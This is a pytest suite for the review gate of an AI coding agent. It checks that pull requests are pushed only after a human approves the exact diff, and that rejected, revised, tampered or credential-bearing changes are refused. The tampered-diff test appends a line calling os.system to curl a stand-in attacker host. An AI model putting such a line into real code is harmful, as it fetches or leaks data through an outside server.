"""Review decisions and the push gate.

The gate is the project's central safety claim, so these tests try to get past it: with no
approval, with a rejection, with a revision request, with a stale approval after the diff
changed, and by approving twice.
"""

from pathlib import Path

import pytest
from httpx import AsyncClient
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from app.agent.diff import ChangeSet, FileDiff
from app.agent.orchestrator import RunAborted, create_pull_request
from app.agent.risk import RiskAssessment, RiskLevel
from app.agent.runtime import AgentRuntime, build_registry
from app.agent.schemas import ImplementationPlan
from app.agent.states import RunState
from app.db.base import new_id
from app.github import tokens
from app.github.client import GitHubClient, GitHubError
from app.llm.fake import FakeLLMProvider
from app.models.core import AgentRun, GitHubConnection, Job
from app.models.review import PullRequest
from app.rag.embeddings import FakeEmbeddingProvider
from app.sandbox.local import LocalSubprocessSandbox
from app.security.crypto import build_cipher
from app.services import event_service, job_queue, review_service
from app.services.review_service import (
    ApprovalRequiredError,
    Decision,
    ReviewError,
    assert_push_allowed,
    branch_name,
    hash_diff,
    pull_request_body,
)

PLAN_JSON = {
    "problem_understanding": "ValueError escapes as a 500",
    "relevant_files": ["app/profile.py"],
    "suspected_root_cause": "the error is never mapped to a 422",
    "root_cause_confidence": "medium",
    "proposed_changes": [
        {"path": "app/profile.py", "intent": "raise a domain error", "is_new_file": False}
    ],
    "tests_to_add_or_update": ["tests/test_profile.py"],
    "risks": [],
    "verification_strategy": "run pytest",
    "out_of_scope": [],
}

DIFF_TEXT = (
    "--- a/app/profile.py\n"
    "+++ b/app/profile.py\n"
    "-            raise ValueError('email is required')\n"
    "+            raise ValidationError('email is required')\n"
)


def change_set(diff_text: str = DIFF_TEXT) -> ChangeSet:
    return ChangeSet(
        files=[
            FileDiff(
                path="app/profile.py",
                action="modified",
                lines_added=1,
                lines_removed=1,
                is_sensitive=False,
                diff_text=diff_text,
            )
        ]
    )


def low_risk() -> RiskAssessment:
    return RiskAssessment(level=RiskLevel.low, score=1, reasons=["small change"])


def blocking_risk() -> RiskAssessment:
    return RiskAssessment(
        level=RiskLevel.high,
        score=20,
        reasons=["possible credential in the diff"],
        warnings=["The diff appears to add a GitHub token."],
        blocking=True,
    )


async def make_run(
    db: AsyncSession, seeded: dict[str, str], state: RunState = RunState.WAITING_FOR_APPROVAL
) -> AgentRun:
    run = AgentRun(
        id=new_id(),
        user_id=seeded["user_id"],
        repository_id=seeded["repository_id"],
        issue_id=seeded["issue_id"],
        state=str(state),
        max_iterations=5,
        iteration=2,
    )
    db.add(run)
    await db.flush()
    return run


async def prepare_review(
    db: AsyncSession,
    seeded: dict[str, str],
    *,
    risk: RiskAssessment | None = None,
    diff_text: str = DIFF_TEXT,
) -> AgentRun:
    run = await make_run(db, seeded)

    await review_service.store_plan(
        db, run_id=run.id, plan=ImplementationPlan.model_validate(PLAN_JSON)
    )
    await review_service.store_diff(
        db, run_id=run.id, change_set=change_set(diff_text), risk=risk or low_risk()
    )
    await db.flush()
    return run


class TestTheGate:
    async def test_push_is_refused_without_any_approval(
        self, db: AsyncSession, seeded: dict[str, str]
    ) -> None:
        run = await prepare_review(db, seeded)

        with pytest.raises(ApprovalRequiredError, match="No approval exists"):
            await assert_push_allowed(db, run_id=run.id, diff_text=DIFF_TEXT)

    async def test_push_is_allowed_after_approval(
        self, db: AsyncSession, seeded: dict[str, str]
    ) -> None:
        run = await prepare_review(db, seeded)
        await review_service.approve(db, run=run, user_id=seeded["user_id"])

        approval = await assert_push_allowed(db, run_id=run.id, diff_text=DIFF_TEXT)

        assert approval.decision == Decision.approved

    async def test_push_is_refused_after_rejection(
        self, db: AsyncSession, seeded: dict[str, str]
    ) -> None:
        run = await prepare_review(db, seeded)
        await review_service.reject(db, run=run, user_id=seeded["user_id"], comment="no")

        with pytest.raises(ApprovalRequiredError, match="not approved"):
            await assert_push_allowed(db, run_id=run.id, diff_text=DIFF_TEXT)

    async def test_push_is_refused_after_a_revision_request(
        self, db: AsyncSession, seeded: dict[str, str]
    ) -> None:
        run = await prepare_review(db, seeded)
        await review_service.request_revision(
            db, run=run, user_id=seeded["user_id"], comment="handle None too"
        )

        with pytest.raises(ApprovalRequiredError, match="not approved"):
            await assert_push_allowed(db, run_id=run.id, diff_text=DIFF_TEXT)

    async def test_approval_does_not_carry_over_to_a_changed_diff(
        self, db: AsyncSession, seeded: dict[str, str]
    ) -> None:
        """The attack this prevents: approve a small diff, then push a different one.

        Binding the approval to a hash of the reviewed content means "approved" can never
        silently mean "approved something else".
        """
        run = await prepare_review(db, seeded)
        await review_service.approve(db, run=run, user_id=seeded["user_id"])

        tampered = DIFF_TEXT + "+os.system('curl evil.example.com')\n"

        with pytest.raises(ApprovalRequiredError, match="modified since it was approved"):
            await assert_push_allowed(db, run_id=run.id, diff_text=tampered)

    async def test_gate_raises_rather_than_returning_false(
        self, db: AsyncSession, seeded: dict[str, str]
    ) -> None:
        """A caller cannot ignore an exception by forgetting to check a return value."""
        run = await prepare_review(db, seeded)

        with pytest.raises(ApprovalRequiredError):
            await assert_push_allowed(db, run_id=run.id, diff_text=DIFF_TEXT)


class TestDecisions:
    async def test_approval_is_recorded_with_the_reviewed_hash(
        self, db: AsyncSession, seeded: dict[str, str]
    ) -> None:
        run = await prepare_review(db, seeded)

        approval = await review_service.approve(
            db, run=run, user_id=seeded["user_id"], comment="looks right"
        )

        assert approval.decision == Decision.approved
        assert approval.diff_hash == hash_diff(DIFF_TEXT)
        assert approval.comment == "looks right"

    async def test_approval_writes_a_timeline_event(
        self, db: AsyncSession, seeded: dict[str, str]
    ) -> None:
        run = await prepare_review(db, seeded)
        await review_service.approve(db, run=run, user_id=seeded["user_id"])

        events = await event_service.list_events(db, run.id)

        assert any(event.kind == event_service.EventKind.APPROVAL for event in events)

    async def test_deciding_twice_is_a_conflict(
        self, db: AsyncSession, seeded: dict[str, str]
    ) -> None:
        """The first decision may already have authorised a push, so it is not overwritable."""
        run = await prepare_review(db, seeded)
        await review_service.approve(db, run=run, user_id=seeded["user_id"])

        with pytest.raises(ReviewError, match="already been decided"):
            await review_service.reject(db, run=run, user_id=seeded["user_id"])

    async def test_credential_in_the_diff_cannot_be_approved(
        self, db: AsyncSession, seeded: dict[str, str]
    ) -> None:
        """Refused before a human is asked. Approving a leaked secret is not a valid choice."""
        run = await prepare_review(db, seeded, risk=blocking_risk())

        with pytest.raises(ReviewError, match="credential"):
            await review_service.approve(db, run=run, user_id=seeded["user_id"])

    async def test_rejection_terminates_the_run(
        self, db: AsyncSession, seeded: dict[str, str]
    ) -> None:
        run = await prepare_review(db, seeded)

        await review_service.reject(db, run=run, user_id=seeded["user_id"], comment="wrong fix")

        assert run.state == str(RunState.FAILED)
        assert run.failure_category == "HUMAN_REJECTION"

    async def test_revision_request_returns_the_run_to_planning(
        self, db: AsyncSession, seeded: dict[str, str]
    ) -> None:
        """Distinct from rejection: the work is kept and the agent gets direction."""
        run = await prepare_review(db, seeded)

        await review_service.request_revision(
            db, run=run, user_id=seeded["user_id"], comment="also handle a None email"
        )

        assert run.state == str(RunState.PLANNING)

    async def test_revision_request_requires_a_reason(
        self, db: AsyncSession, seeded: dict[str, str]
    ) -> None:
        run = await prepare_review(db, seeded)

        with pytest.raises(ReviewError, match="explain what needs to change"):
            await review_service.request_revision(
                db, run=run, user_id=seeded["user_id"], comment="   "
            )

    async def test_cannot_decide_a_run_that_is_not_awaiting_approval(
        self, db: AsyncSession, seeded: dict[str, str]
    ) -> None:
        run = await make_run(db, seeded, state=RunState.TESTING)

        with pytest.raises(ReviewError, match="not awaiting approval"):
            await review_service.approve(db, run=run, user_id=seeded["user_id"])

    async def test_cannot_decide_without_a_diff(
        self, db: AsyncSession, seeded: dict[str, str]
    ) -> None:
        run = await make_run(db, seeded)

        with pytest.raises(ReviewError, match="no diff to review"):
            await review_service.approve(db, run=run, user_id=seeded["user_id"])


class TestPlanVersioning:
    async def test_a_second_plan_is_a_new_version(
        self, db: AsyncSession, seeded: dict[str, str]
    ) -> None:
        """A revision request must not erase what was originally reviewed."""
        run = await make_run(db, seeded)
        plan = ImplementationPlan.model_validate(PLAN_JSON)

        first = await review_service.store_plan(db, run_id=run.id, plan=plan)
        second = await review_service.store_plan(db, run_id=run.id, plan=plan)

        assert first.version == 1
        assert second.version == 2

        latest = await review_service.latest_plan(db, run.id)
        assert latest is not None
        assert latest.version == 2


class TestPullRequestBody:
    async def test_body_states_it_was_agent_generated_and_human_approved(
        self, db: AsyncSession, seeded: dict[str, str]
    ) -> None:
        run = await prepare_review(db, seeded)
        plan = await review_service.latest_plan(db, run.id)
        diff = await review_service.latest_diff(db, run.id)

        assert plan is not None and diff is not None

        body = pull_request_body(
            issue_number=7,
            plan=plan,
            diff=diff,
            test_summary="Tests passed (12 passed)",
            iterations=2,
        )

        assert "Closes #7" in body
        assert "AI software engineering agent" in body
        assert "approved by a human reviewer" in body
        # The risk score must not be presented as a safety guarantee.
        assert "not a" in body and "security guarantee" in body
        assert "hypothesis" in body

    async def test_body_repeats_reviewer_warnings(
        self, db: AsyncSession, seeded: dict[str, str]
    ) -> None:
        """Warnings must survive into the place other people will actually read."""
        run = await make_run(db, seeded)
        await review_service.store_plan(
            db, run_id=run.id, plan=ImplementationPlan.model_validate(PLAN_JSON)
        )
        await review_service.store_diff(
            db,
            run_id=run.id,
            change_set=change_set(),
            risk=RiskAssessment(
                level=RiskLevel.medium,
                score=5,
                reasons=["dependency change"],
                warnings=["requirements.txt changes dependencies."],
            ),
        )
        await db.flush()

        plan = await review_service.latest_plan(db, run.id)
        diff = await review_service.latest_diff(db, run.id)
        assert plan is not None and diff is not None

        body = pull_request_body(
            issue_number=7, plan=plan, diff=diff, test_summary="passed", iterations=1
        )

        assert "requirements.txt changes dependencies." in body


class TestBranchNaming:
    def test_branch_includes_the_run_id(self) -> None:
        """Two runs on one issue must not fight over the same branch."""
        first = branch_name("aaaaaaaa-1111-2222-3333-444444444444", 7)
        second = branch_name("bbbbbbbb-1111-2222-3333-444444444444", 7)

        assert first != second
        assert first.startswith("agent/issue-7-")


class TestReviewApi:
    async def test_review_bundle_returns_everything_in_one_request(
        self,
        client: AsyncClient,
        db: AsyncSession,
        seeded: dict[str, str],
        auth_cookie,  # noqa: ANN001
    ) -> None:
        run = await prepare_review(db, seeded)
        await db.commit()

        for name, value in auth_cookie(seeded["user_id"]).items():
            client.cookies.set(name, value)

        response = await client.get(f"/runs/{run.id}/review")

        assert response.status_code == 200
        body = response.json()
        assert body["plan"]["suspected_root_cause"]
        assert body["diff"]["files_changed"] == 1
        assert body["can_approve"] is True
        assert body["approval"] is None

    async def test_blocking_risk_disables_approval_in_the_bundle(
        self,
        client: AsyncClient,
        db: AsyncSession,
        seeded: dict[str, str],
        auth_cookie,  # noqa: ANN001
    ) -> None:
        run = await prepare_review(db, seeded, risk=blocking_risk())
        await db.commit()

        for name, value in auth_cookie(seeded["user_id"]).items():
            client.cookies.set(name, value)

        body = (await client.get(f"/runs/{run.id}/review")).json()

        assert body["diff"]["risk_blocking"] is True
        assert body["can_approve"] is False

    async def test_approve_endpoint_records_the_decision(
        self,
        client: AsyncClient,
        db: AsyncSession,
        seeded: dict[str, str],
        auth_cookie,  # noqa: ANN001
    ) -> None:
        run = await prepare_review(db, seeded)
        await db.commit()

        for name, value in auth_cookie(seeded["user_id"]).items():
            client.cookies.set(name, value)

        response = await client.post(f"/runs/{run.id}/approve", json={"comment": "fine"})

        assert response.status_code == 200
        assert response.json()["decision"] == "approved"

    async def test_second_decision_over_the_api_is_a_conflict(
        self,
        client: AsyncClient,
        db: AsyncSession,
        seeded: dict[str, str],
        auth_cookie,  # noqa: ANN001
    ) -> None:
        run = await prepare_review(db, seeded)
        await db.commit()

        for name, value in auth_cookie(seeded["user_id"]).items():
            client.cookies.set(name, value)

        first = await client.post(f"/runs/{run.id}/approve", json={})
        second = await client.post(f"/runs/{run.id}/reject", json={})

        assert first.status_code == 200
        assert second.status_code == 409

    async def test_revision_request_requires_a_comment(
        self,
        client: AsyncClient,
        db: AsyncSession,
        seeded: dict[str, str],
        auth_cookie,  # noqa: ANN001
    ) -> None:
        run = await prepare_review(db, seeded)
        await db.commit()

        for name, value in auth_cookie(seeded["user_id"]).items():
            client.cookies.set(name, value)

        response = await client.post(f"/runs/{run.id}/request-revision", json={"comment": ""})

        assert response.status_code == 422

    async def test_review_endpoints_require_authentication(
        self, client: AsyncClient, db: AsyncSession, seeded: dict[str, str]
    ) -> None:
        run = await prepare_review(db, seeded)
        await db.commit()

        assert (await client.get(f"/runs/{run.id}/review")).status_code == 401
        assert (await client.post(f"/runs/{run.id}/approve", json={})).status_code == 401

    async def test_another_users_run_is_not_reviewable(
        self,
        client: AsyncClient,
        db: AsyncSession,
        seeded: dict[str, str],
        auth_cookie,  # noqa: ANN001
    ) -> None:
        """404 rather than 403: the API must not confirm someone else's run exists."""
        from app.models.core import User

        run = await prepare_review(db, seeded)

        intruder = User(id=new_id(), github_user_id=8888, github_login="intruder")
        db.add(intruder)
        await db.commit()

        for name, value in auth_cookie(intruder.id).items():
            client.cookies.set(name, value)

        assert (await client.get(f"/runs/{run.id}/review")).status_code == 404
        assert (await client.post(f"/runs/{run.id}/approve", json={})).status_code == 404


class TestDiffStorage:
    async def test_diff_hash_is_stable_and_content_bound(
        self, db: AsyncSession, seeded: dict[str, str]
    ) -> None:
        run = await make_run(db, seeded)

        stored = await review_service.store_diff(
            db, run_id=run.id, change_set=change_set(), risk=low_risk()
        )

        assert stored.diff_hash == hash_diff(DIFF_TEXT)
        assert stored.diff_hash != hash_diff(DIFF_TEXT + "extra\n")

    async def test_risk_details_are_persisted_for_the_reviewer(
        self, db: AsyncSession, seeded: dict[str, str]
    ) -> None:
        run = await make_run(db, seeded)

        stored = await review_service.store_diff(
            db,
            run_id=run.id,
            change_set=change_set(),
            risk=RiskAssessment(
                level=RiskLevel.medium,
                score=5,
                reasons=["touches authentication code"],
                warnings=["review the effect of merging it"],
            ),
        )

        assert stored.risk_level == "MEDIUM"
        assert stored.risk_reasons == ["touches authentication code"]
        assert stored.risk_warnings == ["review the effect of merging it"]


class FakeGitHub:
    """Stands in for `GitHubClient` at the transport boundary.

    `PullRequestClient` talks to exactly one method, so faking that is enough to exercise the
    real branch-create, commit-per-file and open-pull-request sequence without a network call.
    """

    def __init__(self, *, existing_files: set[str] | None = None) -> None:
        self.existing = existing_files or set()
        self.calls: list[tuple[str, str]] = []
        self.committed: list[str] = []
        self.deleted: list[str] = []

    async def _request(  # noqa: ANN401 - mirrors the real client's loose signature
        self,
        method: str,
        path: str,
        *,
        params: dict | None = None,
        json: dict | None = None,
    ):
        self.calls.append((method, path))

        if method == "GET" and "/git/ref/heads/" in path:
            return {"object": {"sha": "base-sha"}}

        if method == "POST" and path.endswith("/git/refs"):
            return {}

        if "/contents/" in path:
            target = path.split("/contents/", 1)[1]

            if method == "GET":
                if target in self.existing:
                    return {"sha": f"blob-{target}"}
                raise GitHubError(404, "Not Found")

            if method == "PUT":
                self.committed.append(target)
                return {"commit": {"sha": "commit-sha"}}

            if method == "DELETE":
                self.deleted.append(target)
                return {"commit": {"sha": "delete-sha"}}

        if method == "POST" and path.endswith("/pulls"):
            return {
                "number": 42,
                "html_url": "https://github.com/diksha/demo-repo/pull/42",
                "head": {"sha": "commit-sha"},
            }

        raise AssertionError(f"unexpected GitHub call: {method} {path}")


def publish_runtime(settings, workspace_root: Path) -> AgentRuntime:  # noqa: ANN001
    """A runtime carrying only what pull-request creation actually reads.

    The model, embedding provider and sandbox are never touched on this path, so they are
    scripted-empty rather than mocked: if the code did reach for one, the test would fail.
    """
    return AgentRuntime(
        settings=settings,
        llm=FakeLLMProvider([]),
        embeddings=FakeEmbeddingProvider(),
        sandbox=LocalSubprocessSandbox(),
        registry=build_registry(),
        workspace_root=workspace_root,
    )


def seed_workspace(root: Path, run_id: str) -> Path:
    checkout = root / run_id
    (checkout / "app").mkdir(parents=True)
    (checkout / "app" / "profile.py").write_text("updated content\n", encoding="utf-8")
    return checkout


class TestPublishing:
    async def test_approval_queues_the_pull_request_job(
        self, db: AsyncSession, seeded: dict[str, str]
    ) -> None:
        """Approving must actually cause a push to be attempted.

        The approval row and the job are written in one transaction, so a run can never be
        left approved but unpublished.
        """
        run = await prepare_review(db, seeded)

        await review_service.approve(db, run=run, user_id=seeded["user_id"])
        await db.flush()

        jobs = (
            (await db.execute(select(Job).where(Job.run_id == run.id))).scalars().all()
        )

        assert [job.kind for job in jobs] == [job_queue.JobKind.CREATE_PULL_REQUEST]
        assert jobs[0].status == job_queue.JobStatus.QUEUED

    async def test_publishing_commits_each_file_and_opens_the_pull_request(
        self, db: AsyncSession, seeded: dict[str, str], settings, tmp_path: Path
    ) -> None:  # noqa: ANN001
        run = await prepare_review(db, seeded)
        await review_service.approve(db, run=run, user_id=seeded["user_id"])
        await db.commit()

        seed_workspace(tmp_path, run.id)
        github = FakeGitHub()

        await create_pull_request(
            db,
            runtime=publish_runtime(settings, tmp_path),
            run=run,
            github_client=github,
        )

        assert github.committed == ["app/profile.py"]
        assert github.deleted == []

        await db.refresh(run)
        assert RunState(run.state) is RunState.COMPLETED

        pull_request = (
            await db.execute(select(PullRequest).where(PullRequest.run_id == run.id))
        ).scalar_one()

        assert pull_request.number == 42
        assert pull_request.branch == review_service.branch_name(run.id, 7)

        # The checkout is the largest thing a run leaves behind, and it is finished with.
        assert not (tmp_path / run.id).exists()

    async def test_publishing_without_approval_fails_the_run_and_raises(
        self, db: AsyncSession, seeded: dict[str, str], settings, tmp_path: Path
    ) -> None:  # noqa: ANN001
        """The gate is checked at the push, not only at the button."""
        run = await prepare_review(db, seeded)
        seed_workspace(tmp_path, run.id)
        github = FakeGitHub()

        with pytest.raises(ApprovalRequiredError):
            await create_pull_request(
                db,
                runtime=publish_runtime(settings, tmp_path),
                run=run,
                github_client=github,
            )

        assert github.calls == [], "nothing should reach GitHub without an approval"

        await db.refresh(run)
        assert RunState(run.state) is RunState.FAILED
        assert run.failure_category == "SECURITY_BLOCK"

    async def test_publishing_a_changed_workspace_is_refused(
        self, db: AsyncSession, seeded: dict[str, str], settings, tmp_path: Path
    ) -> None:  # noqa: ANN001
        """An approval is bound to one diff, so a newer diff invalidates it."""
        run = await prepare_review(db, seeded)
        await review_service.approve(db, run=run, user_id=seeded["user_id"])

        # Something produced a second, different diff after the human looked.
        await review_service.store_diff(
            db,
            run_id=run.id,
            change_set=change_set(DIFF_TEXT + "+ and one more line\n"),
            risk=low_risk(),
        )
        await db.commit()

        seed_workspace(tmp_path, run.id)

        with pytest.raises(ApprovalRequiredError, match="modified since it was approved"):
            await create_pull_request(
                db,
                runtime=publish_runtime(settings, tmp_path),
                run=run,
                github_client=FakeGitHub(),
            )

    async def test_publishing_without_a_workspace_fails_cleanly(
        self, db: AsyncSession, seeded: dict[str, str], settings, tmp_path: Path
    ) -> None:  # noqa: ANN001
        run = await prepare_review(db, seeded)
        await review_service.approve(db, run=run, user_id=seeded["user_id"])
        await db.commit()

        with pytest.raises(RunAborted):
            await create_pull_request(
                db,
                runtime=publish_runtime(settings, tmp_path),
                run=run,
                github_client=FakeGitHub(),
            )

        await db.refresh(run)
        assert RunState(run.state) is RunState.FAILED
        assert "workspace" in (run.failure_detail or "").lower()

    async def test_token_is_decrypted_for_the_worker(
        self, db: AsyncSession, seeded: dict[str, str], settings
    ) -> None:  # noqa: ANN001
        """The worker reads the credential itself, long after the HTTP request ended.

        A fixed key is used here on purpose: the shared test settings leave
        TOKEN_ENCRYPTION_KEY unset, which generates an ephemeral key per call and could never
        decrypt anything written earlier.
        """
        from cryptography.fernet import Fernet

        fixed = settings.model_copy(
            update={"token_encryption_key": Fernet.generate_key().decode()}
        )

        connection = (
            await db.execute(
                select(GitHubConnection).where(GitHubConnection.user_id == seeded["user_id"])
            )
        ).scalar_one()
        connection.encrypted_token = build_cipher(fixed).encrypt("ghp_worker_token_000")
        await db.flush()

        client = await tokens.client_for_user(db, settings=fixed, user_id=seeded["user_id"])

        assert isinstance(client, GitHubClient)

    async def test_unreadable_credential_is_reported_as_itself(
        self, db: AsyncSession, seeded: dict[str, str], settings
    ) -> None:  # noqa: ANN001
        """A rotated encryption key must say "reconnect", not fail generically."""
        with pytest.raises(tokens.CredentialUnreadableError):
            await tokens.client_for_user(db, settings=settings, user_id=seeded["user_id"])

    async def test_missing_connection_is_reported_as_itself(
        self, db: AsyncSession, settings
    ) -> None:  # noqa: ANN001
        from app.models.core import User

        user = User(id=new_id(), github_login="nolink", github_user_id=777)
        db.add(user)
        await db.flush()

        with pytest.raises(tokens.ConnectionMissingError):
            await tokens.client_for_user(db, settings=settings, user_id=user.id)
